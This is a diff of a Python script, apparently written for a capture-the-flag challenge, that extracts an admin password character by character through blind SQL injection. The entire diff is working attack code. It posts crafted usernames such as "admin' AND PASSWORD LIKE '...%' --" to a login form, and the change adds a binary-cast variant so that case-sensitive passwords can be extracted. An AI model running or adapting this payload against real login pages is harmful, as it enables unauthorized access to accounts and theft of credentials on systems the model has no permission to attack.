@@ -11,10 +11,11 @@ myobj = {
 # print(x.text)
 
 matKhauHienTai = 'TTHL{'
+matKhauHienTai = ''
 kyTuHienTai = ''
 
-while kyTuHienTai != '}':
-    for i in range(33, 127):
+while kyTuHienTai != chr(127):
+    for i in range(33, 128):
         # print(i, ' => ', chr(i))
         kyTuHienTai = chr(i)
         if(kyTuHienTai == '%'):
@@ -24,11 +25,15 @@ while kyTuHienTai != '}':
             'username': f"admin' AND PASSWORD LIKE '{matKhauTam}%' --",
             "login": "Submit"
         }
+        myobj = {
+            'username': f"admin' AND cast(PASSWORD as binary) LIKE cast('{matKhauTam}%' as binary) --",
+            "login": "Submit"
+        }
         x = requests.post(url, data  = myobj)
         if("User exists" in x.text):
             matKhauHienTai = matKhauTam
             print(matKhauHienTai)
             break
-        if(i == 126):
+        if(i == 127):
             print('xong')
             break
